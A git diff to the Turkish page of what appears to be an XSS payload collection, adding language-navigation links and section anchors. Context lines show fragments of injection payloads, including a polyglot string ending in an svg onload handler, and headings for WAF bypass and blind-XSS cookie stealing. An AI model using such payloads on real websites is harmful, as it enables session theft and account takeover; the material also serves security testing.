@@ -1,5 +1,8 @@
 # 💉 XSS (Cross-Site Scripting) Payload Koleksiyonu
 
+<!-- language-home-navigation -->
+[🏠 Türkçe ana sayfa](../../README.tr.md) • [🌐 Languages](../../README.md#-available-languages)
+
 [🇬🇧 English](../XSS.md)
 
 ```
@@ -262,6 +265,7 @@ ${alert`XSS`}
 
 ---
 
+<a id="-waf-atlatma"></a>
 ## 🛡️ WAF Atlatma
 
 ### Çift Kodlama (Double Encoding)
@@ -354,6 +358,7 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onm
 
 ---
 
+<a id="-kör-blind-xss"></a>
 ## 👁️ Kör (Blind) XSS
 
 ### Çerez Çalma (Cookie Stealer)
